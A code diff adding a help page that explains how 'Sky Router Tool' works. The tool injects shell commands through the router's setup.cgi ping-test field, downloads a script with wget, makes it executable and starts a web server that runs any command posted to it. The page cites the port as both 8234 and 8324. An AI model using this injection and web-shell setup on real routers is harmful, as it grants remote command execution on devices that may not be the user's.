@@ -1,0 +1,43 @@
+<&contentdata 
+section_name = 'help'
+page_name = 'howitworks'
+author = 'mrmt32'
+type = 'page'
+>
+<h2>Advanced Help - How Sky Router Tool Works</h2>
+<div class='helpPage'>
+	<p>Sky Router Tool first checks to see if it can access http://192.168.0.1:8234/do_cmd.sh (Which it wont be able to if the router has been restarted since the tool was last run).</p>
+
+	<p>
+		If it cant access the page it then runs the following commands using the URL injection hack (http://192.168.0.1/setup.cgi?todo=ping_test&nextfile=diagping.htm&c4_IPAddr=127.0.0.1>/dev/null;...):
+	
+		<table>
+			<tr class='odd'>
+				<td>mkdir /tmp/new_web</td><td>- Makes a new temporary directory</td>
+			</tr>
+			<tr>
+				<td>rm /tmp/new_web/do_cmd.sh</td><td>- Removes any old cgi script</td>
+			</tr>
+			<tr class='odd'>
+				<td>wget -P /tmp/new_web http://computer running sky router tool/do_cmd.sh</td><td>- Downloads the cgi script from the sky router tool web interface</td>
+			</tr>
+			<tr>
+				<td>chmod 777 /tmp/new_web/do_cmd.sh</td><td>- Adds execute permissons to the script</td>
+			</tr>
+			<tr class='odd'>
+				<td>ln /etc/htpasswd /tmp/new_web/.htpasswd</td><td>- Link to htpasswd file (makes the new web server be username/password protected)</td>
+			</tr>
+			<tr>
+				<td>kill `cat /tmp/mini_httpd.pid`</td><td>- Kill any already running http servers created by sky router tool</td>
+			</tr>
+			<tr class='odd'>
+				<td>mini_httpd -p 8324 -d /tmp/new_web/ -c "**sh" -i /tmp/mini_httpd.pid</td><td>- Starts a new web server on port 8324</td>
+			</tr>
+		</table>
+	</p>
+	
+	<p>do_cmd.sh is just a simple script which runs any commands which are posted to it (you can find a copy of it in the 'htdocs' folder of the Sky Router Tool installation directory). Sky Router Tool uses this do_cmd.sh to send commands to the router and return responses.</p>
+</p>
+
+</div>
+<&/contentdata>
